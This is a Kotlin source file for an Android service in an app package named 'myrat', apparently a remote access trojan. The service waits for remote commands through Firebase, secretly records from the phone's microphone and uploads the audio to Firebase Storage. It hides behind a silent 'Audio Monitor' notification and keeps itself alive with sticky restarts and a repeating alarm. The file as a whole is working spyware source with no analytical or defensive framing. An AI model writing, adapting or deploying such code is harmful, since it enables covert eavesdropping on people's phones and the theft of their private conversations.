package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.FirebaseStorage
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException

class MicrophoneService : Service() {
    companion object {
        private const val CHANNEL_ID = "MicrophoneServiceChannel"
        private const val NOTIFICATION_ID = 14
    }

    private val db = Firebase.database.reference
    private val storage = FirebaseStorage.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentRecordingFile: File? = null
    private var recordingStartTime = 0L

    override fun onCreate() {
        super.onCreate()
        try {
            deviceId = MainActivity.getDeviceId(this)
            startForegroundService()
            scheduleRestart(this)
            listenForRecordingCommands()
            Logger.log("MicrophoneService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to create MicrophoneService", e)
            stopSelf()
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val alarmIntent = Intent(context, MicrophoneService::class.java)
            val pendingIntent = PendingIntent.getService(
                context, 0, alarmIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 60_000,
                5 * 60_000,
                pendingIntent
            )
        } catch (e: Exception) {
            Logger.error("Failed to schedule microphone service restart", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "Microphone Recording Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Audio Monitor")
                .setContentText("Monitoring audio recording commands")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start microphone foreground service", e)
        }
    }

    private fun listenForRecordingCommands() {
        try {
            val commandRef = db.child("Device").child(deviceId).child("microphone_commands")
            commandRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
                            val action = command["action"] as? String ?: return@forEach
                            val commandId = commandSnapshot.key ?: return@forEach
                            val status = command["status"] as? String ?: return@forEach
                            val duration = command["duration"] as? Long ?: 30000L // Default 30 seconds

                            if (status == "pending") {
                                Logger.log("Processing microphone command: $action with ID: $commandId")
                                
                                when (action) {
                                    "startRecording" -> {
                                        scope.launch {
                                            startRecording(commandId, duration)
                                        }
                                    }
                                    "stopRecording" -> {
                                        scope.launch {
                                            stopRecording(commandId)
                                        }
                                    }
                                }
                                
                                // Remove the command after processing
                                commandSnapshot.ref.removeValue()
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing microphone commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Microphone commands listener cancelled", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to setup microphone commands listener", e)
        }
    }

    private suspend fun startRecording(commandId: String, duration: Long): Boolean {
        return try {
            if (isRecording) {
                Logger.log("Already recording, stopping previous recording")
                stopRecording("auto_stop_${System.currentTimeMillis()}")
            }

            if (!hasRecordAudioPermission()) {
                Logger.error("Record audio permission not granted")
                updateRecordingStatus(commandId, "failed", "Record audio permission not granted")
                return false
            }

            updateRecordingStatus(commandId, "starting", null)

            // Create recording file
            val recordingsDir = File(cacheDir, "recordings")
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs()
            }

            val fileName = "recording_${commandId}_${System.currentTimeMillis()}.3gp"
            currentRecordingFile = File(recordingsDir, fileName)

            // Setup MediaRecorder
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(currentRecordingFile?.absolutePath)
                setMaxDuration(duration.toInt())
                
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        Logger.log("Recording max duration reached, stopping")
                        scope.launch {
                            stopRecording(commandId)
                        }
                    }
                }
            }

            try {
                mediaRecorder?.prepare()
                mediaRecorder?.start()
                isRecording = true
                recordingStartTime = System.currentTimeMillis()
                
                Logger.log("Recording started: $fileName, duration: ${duration}ms")
                updateRecordingStatus(commandId, "recording", null)

                // Auto-stop after duration
                delay(duration)
                if (isRecording) {
                    stopRecording(commandId)
                }

                true
            } catch (e: IOException) {
                Logger.error("Failed to start recording", e)
                mediaRecorder?.release()
                mediaRecorder = null
                currentRecordingFile?.delete()
                currentRecordingFile = null
                updateRecordingStatus(commandId, "failed", "Failed to start recording: ${e.message}")
                false
            }
        } catch (e: Exception) {
            Logger.error("Error in startRecording", e)
            updateRecordingStatus(commandId, "failed", "Error starting recording: ${e.message}")
            false
        }
    }

    private suspend fun stopRecording(commandId: String): Boolean {
        return try {
            if (!isRecording || mediaRecorder == null) {
                Logger.log("No active recording to stop")
                updateRecordingStatus(commandId, "failed", "No active recording")
                return false
            }

            updateRecordingStatus(commandId, "stopping", null)

            try {
                mediaRecorder?.stop()
                mediaRecorder?.release()
                mediaRecorder = null
                isRecording = false

                val recordingDuration = System.currentTimeMillis() - recordingStartTime
                Logger.log("Recording stopped, duration: ${recordingDuration}ms")

                // Upload the recording
                currentRecordingFile?.let { file ->
                    if (file.exists() && file.length() > 0) {
                        uploadRecording(file, commandId, recordingDuration)
                        updateRecordingStatus(commandId, "uploading", null)
                    } else {
                        Logger.error("Recording file is empty or doesn't exist")
                        updateRecordingStatus(commandId, "failed", "Recording file is empty")
                        file.delete()
                    }
                }

                true
            } catch (e: Exception) {
                Logger.error("Error stopping recording", e)
                mediaRecorder?.release()
                mediaRecorder = null
                isRecording = false
                updateRecordingStatus(commandId, "failed", "Error stopping recording: ${e.message}")
                false
            }
        } catch (e: Exception) {
            Logger.error("Error in stopRecording", e)
            updateRecordingStatus(commandId, "failed", "Error stopping recording: ${e.message}")
            false
        }
    }

    private fun uploadRecording(file: File, commandId: String, duration: Long) {
        try {
            scope.launch {
                try {
                    val fileName = file.name
                    val audioRef = storage.child("recordings/$deviceId/$fileName")
                    
                    audioRef.putFile(android.net.Uri.fromFile(file))
                        .addOnSuccessListener {
                            Logger.log("Recording uploaded to storage: $fileName")
                            
                            // Save metadata to database
                            val recordingData = mapOf(
                                "fileName" to fileName,
                                "commandId" to commandId,
                                "timestamp" to System.currentTimeMillis(),
                                "duration" to duration,
                                "size" to file.length(),
                                "storagePath" to "recordings/$deviceId/$fileName",
                                "uploaded" to System.currentTimeMillis()
                            )

                            db.child("Device").child(deviceId).child("recordings").push().setValue(recordingData)
                                .addOnSuccessListener {
                                    Logger.log("Recording metadata saved to database")
                                    updateRecordingStatus(commandId, "completed", null)
                                    
                                    // Clean up local file
                                    file.delete()
                                    currentRecordingFile = null
                                }
                                .addOnFailureListener { e ->
                                    Logger.error("Failed to save recording metadata", e)
                                    updateRecordingStatus(commandId, "failed", "Failed to save metadata: ${e.message}")
                                    file.delete()
                                    currentRecordingFile = null
                                }
                        }
                        .addOnFailureListener { e ->
                            Logger.error("Failed to upload recording to storage", e)
                            updateRecordingStatus(commandId, "failed", "Upload failed: ${e.message}")
                            file.delete()
                            currentRecordingFile = null
                        }
                } catch (e: Exception) {
                    Logger.error("Error in recording upload process", e)
                    updateRecordingStatus(commandId, "failed", "Upload error: ${e.message}")
                    file.delete()
                    currentRecordingFile = null
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to upload recording", e)
            updateRecordingStatus(commandId, "failed", "Upload failed: ${e.message}")
            file.delete()
            currentRecordingFile = null
        }
    }

    private fun updateRecordingStatus(commandId: String, status: String, error: String?) {
        try {
            val statusData = mutableMapOf<String, Any>(
                "commandId" to commandId,
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            
            if (error != null) {
                statusData["error"] = error
            }
            
            if (isRecording) {
                statusData["isRecording"] = true
                statusData["recordingStartTime"] = recordingStartTime
            } else {
                statusData["isRecording"] = false
            }

            db.child("Device").child(deviceId).child("microphone_status").setValue(statusData)
                .addOnSuccessListener {
                    Logger.log("Recording status updated: $status for command: $commandId")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update recording status", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating recording status", e)
        }
    }

    private fun hasRecordAudioPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Stop any active recording
            if (isRecording) {
                scope.launch {
                    stopRecording("service_destroy_${System.currentTimeMillis()}")
                }
            }

            scope.cancel()
            Logger.log("MicrophoneService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying MicrophoneService", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}